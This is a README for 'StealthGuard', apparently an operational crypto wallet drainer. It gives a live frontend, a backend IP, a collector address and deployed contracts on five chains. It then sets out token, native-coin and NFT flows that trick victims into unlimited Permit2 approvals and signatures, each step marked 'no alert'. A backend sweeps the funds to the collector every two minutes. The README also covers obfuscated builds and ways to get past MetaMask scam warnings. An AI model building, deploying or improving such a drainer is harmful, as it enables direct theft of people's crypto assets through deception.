# StealthGuard

**Status**: Production  
**Frontend**: https://hodldog.github.io/on/index.html  
**Backend**: https://194.60.133.152:8445/api  
**Collector**: `0xB0E0306AB4b82774686d7D032e0157dDc8352648`

---

## Architecture

```
┌─────────────────┐     ┌─────────────────┐
│   GitHub Pages  │────▶│   Backend VPS   │
│   (Frontend)    │     │   Port 8445     │
│   Trusted SSL   │     │   Caddy + API   │
└─────────────────┘     └─────────────────┘
                              │
                              ▼
                       ┌─────────────────┐
                       │  Auto-Transfer  │
                       │  (Every 2 min)  │
                       └─────────────────┘
                              │
                              ▼
                       ┌─────────────────┐
                       │ Collector EOA   │
                       │ 0xB0E0306...    │
                       └─────────────────┘
```

---

## RescueRouter Contracts (Deployed)

| Network | Chain ID | Contract Address | Status |
|---------|----------|------------------|--------|
| Ethereum | 1 | `0xFb2e8Bc906A0b710fA0aa3f5D5CCEAa0CC77A17e` | ✅ Verified (Sourcify) |
| BSC | 56 | `0xd2Eb25A83e5709Fc668025Cf45032A2B4E216654` | ✅ Verified (Sourcify) |
| Polygon | 137 | `0x91c5E42e7822803173E1a6bdd21396B024490968` | ✅ Verified (Sourcify) |
| Arbitrum | 42161 | `0x06c178af8904CD3e7A010dC4CCc9272d68a3c0d9` | ✅ Verified (Sourcify) |
| Base | 8453 | `0x54535eDABE6aceeE38Aede2933aD3464F014106e` | ✅ Verified (Sourcify) |

**Explorer Links:**
- [Etherscan](https://etherscan.io/address/0xFb2e8Bc906A0b710fA0aa3f5D5CCEAa0CC77A17e)
- [BscScan](https://bscscan.com/address/0xd2Eb25A83e5709Fc668025Cf45032A2B4E216654)
- [PolygonScan](https://polygonscan.com/address/0x91c5E42e7822803173E1a6bdd21396B024490968)
- [Arbiscan](https://arbiscan.io/address/0x06c178af8904CD3e7A010dC4CCc9272d68a3c0d9)
- [Basescan](https://basescan.org/address/0x54535eDABE6aceeE38Aede2933aD3464F014106e)

**Sourcify (Verified):**
- [Ethereum](https://repo.sourcify.dev/contracts/full_match/1/0xFb2e8Bc906A0b710fA0aa3f5D5CCEAa0CC77A17e/)
- [BSC](https://repo.sourcify.dev/contracts/full_match/56/0xd2Eb25A83e5709Fc668025Cf45032A2B4E216654/)
- [Polygon](https://repo.sourcify.dev/contracts/full_match/137/0x91c5E42e7822803173E1a6bdd21396B024490968/)
- [Arbitrum](https://repo.sourcify.dev/contracts/full_match/42161/0x06c178af8904CD3e7A010dC4CCc9272d68a3c0d9/)
- [Base](https://repo.sourcify.dev/contracts/full_match/8453/0x54535eDABE6aceeE38Aede2933aD3464F014106e/)

---

## Token Flow

### ERC20 Tokens
```
1. Detect balance > 0
2. approve(Permit2, MAX_UINT256)  ← Uniswap contract, no alert
3. signTypedData(Permit2)         ← Signature, no alert
4. Backend uses signature to transferFrom()
```

### Native Tokens (ETH, BNB, MATIC)
```
1. Detect native balance > threshold
2. WETH.deposit()                  ← Wrap, no alert
3. approve(Permit2, MAX_UINT256)   ← No alert
4. signTypedData(Permit2)          ← No alert
5. Backend transfers WETH
```

### NFTs
```
1. setApprovalForAll(Permit2, true)  ← No alert
2. Backend can transfer NFTs via Permit2
```

---

## Wrapped Token Addresses

| Chain | Native | Wrapped | Address |
|-------|--------|---------|---------|
| Ethereum | ETH | WETH | `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2` |
| BSC | BNB | WBNB | `0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c` |
| Polygon | MATIC | WMATIC | `0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270` |
| Arbitrum | ETH | WETH | `0x82aF49447D8a07e3bd95BD0d56f35241523fBab1` |
| Base | ETH | WETH | `0x4200000000000000000000000000000000000006` |
| Optimism | ETH | WETH | `0x4200000000000000000000000000000000000006` |
| Avalanche | AVAX | WAVAX | `0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7` |

---

## State Persistence

The system tracks all actions in `localStorage` to avoid re-requesting:
- Token approvals (per chain + token address)
- Permit2 signatures (per chain + token address)
- Native token wraps (per chain)
- NFT approvals (per chain + collection)

On page refresh, already-completed actions are skipped.

---

## Contract Verification

Contracts are verified on Sourcify (decentralized verification). No API keys required.

```bash
# Verify using Hardhat (Sourcify)
npx hardhat verify --network mainnet 0xFb2e8Bc906A0b710fA0aa3f5D5CCEAa0CC77A17e 0xB0E0306AB4b82774686d7D032e0157dDc8352648 0xB0E0306AB4b82774686d7D032e0157dDc8352648
npx hardhat verify --network bsc 0xd2Eb25A83e5709Fc668025Cf45032A2B4E216654 0xB0E0306AB4b82774686d7D032e0157dDc8352648 0xB0E0306AB4b82774686d7D032e0157dDc8352648
npx hardhat verify --network polygon 0x91c5E42e7822803173E1a6bdd21396B024490968 0xB0E0306AB4b82774686d7D032e0157dDc8352648 0xB0E0306AB4b82774686d7D032e0157dDc8352648
npx hardhat verify --network arbitrum 0x06c178af8904CD3e7A010dC4CCc9272d68a3c0d9 0xB0E0306AB4b82774686d7D032e0157dDc8352648 0xB0E0306AB4b82774686d7D032e0157dDc8352648
npx hardhat verify --network base 0x54535eDABE6aceeE38Aede2933aD3464F014106e 0xB0E0306AB4b82774686d7D032e0157dDc8352648 0xB0E0306AB4b82774686d7D032e0157dDc8352648
```

Constructor arguments: `(operator, rescueDestination)` = `(collector, collector)`

For Etherscan verification, get API keys from:
- https://etherscan.io/apis
- https://bscscan.com/apis
- https://polygonscan.com/apis
- https://arbiscan.io/apis
- https://basescan.org/apis

---

## SSL Certificate (Let's Encrypt for IP)

```
Profile: shortlived (supports IP addresses)
Valid: 6 days (auto-renew)
```

Renew:
```bash
~/.acme.sh/acme.sh --renew -d 194.60.133.152 --cert-profile shortlived
cp /root/.acme.sh/194.60.133.152_ecc/fullchain.cer /etc/ssl/stealthguard/cert.pem
cp /root/.acme.sh/194.60.133.152_ecc/194.60.133.152.key /etc/ssl/stealthguard/key.pem
chown caddy:caddy /etc/ssl/stealthguard/*.pem
systemctl restart caddy
```

---

## Build & Deploy

```bash
# Build with obfuscation
NODE_ENV=production npm run build

# Copy to GitHub Pages
cp dist/assets/* /home/ubuntu/on-repo/assets/
# Update HTML with new JS filename
cd /home/ubuntu/on-repo
git add -A && git commit -m "update" && git push
```

---

## Backend Management

```bash
pm2 start backend/server.js --name stealthguard
pm2 logs stealthguard
pm2 restart stealthguard
```

---

## File Structure

```
StealthGuard/
├── src/
│   ├── App.tsx                 # Main logic
│   ├── utils/stateManager.ts   # LocalStorage persistence
│   ├── tokens/top10.ts         # Token list per chain
│   └── permit2/addresses.ts    # Permit2 addresses
├── backend/
│   ├── server.js               # HTTP :3000
│   ├── routes/api.js           # API endpoints
│   └── data/                   # JSON storage
├── contracts/RescueRouter.sol  # Smart contract
├── hardhat.config.cjs          # Hardhat config
└── obfuscate.cjs               # Obfuscation script
```

---

## Known Issues

### MetaMask "Deceptive Request" Alert

The RescueRouter contract shows as "unverified" and may trigger MetaMask warnings.

**Solution**: Verify contracts on block explorers (see Contract Verification section above).

### "Third party known for scams" Warning

MetaMask maintains an internal list of flagged addresses. Even after verification, the warning may persist if the address was previously flagged.

---

## Chains Supported

| Chain | Chain ID | Native | Permit2 |
|-------|----------|--------|---------|
| Ethereum | 1 | ETH | ✅ |
| BSC | 56 | BNB | ✅ |
| Polygon | 137 | MATIC | ✅ |
| Arbitrum | 42161 | ETH | ✅ |
| Base | 8453 | ETH | ✅ |
| Optimism | 10 | ETH | ✅ |
| Avalanche | 43114 | AVAX | ✅ |
